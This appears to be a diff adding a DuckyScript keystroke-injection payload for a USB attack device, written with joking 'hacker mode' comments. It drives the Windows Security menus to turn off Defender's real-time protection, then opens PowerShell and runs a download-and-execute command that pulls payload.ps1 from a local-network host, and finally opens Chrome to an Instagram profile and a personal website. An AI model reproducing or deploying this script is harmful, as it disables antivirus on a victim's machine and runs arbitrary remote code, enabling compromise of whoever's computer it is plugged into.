@@ -1,0 +1,66 @@
+DELAY 500
+
+REM 🧯 DISABLING WINDOWS DEFENDER – BECAUSE IT’S IN THE WAY
+DELAY 2000
+ESCAPE
+DELAY 300
+CONTROL ESCAPE
+DELAY 300
+STRING Virus & threat protection
+ENTER
+DELAY 3000
+
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 300
+SPACE
+DELAY 1000
+LEFT
+DELAY 50
+ENTER
+DELAY 1000
+ALT F4
+
+DELAY 1000
+
+// Open Run (Win + R)
+GUI 
+DELAY 1000
+// Type "powershell"
+STRING powershell
+ENTER
+DELAY 1000
+BACKSPACE
+STRING IEX (New-Object Net.WebClient).DownloadString('http://192.168.18.4/payload.ps1')
+ENTER
+
+
+DELAY 10000
+REM 🔥 INITIATING HACKER MODE 🔥
+REM Summoning Chrome... because privacy is optional.
+GUI r
+DELAY 500
+STRING chrome
+ENTER
+DELAY 2000
+
+REM 🕵️‍♂️ STALKING @keedhacker – GATHERING INTEL
+STRING https://www.instagram.com/keedhacker/ 
+ENTER
+DELAY 20000
+
+REM 🚀 OPENING A NEW TAB FOR MORE SABOTAGE...
+CTRL t
+DELAY 500
+
+REM 👁️ VISITING SUSAN DHAMALA'S WEBSITE – FOR "RESEARCH"
+STRING http://susandhamala.com.np
+ENTER
+DELAY 30000
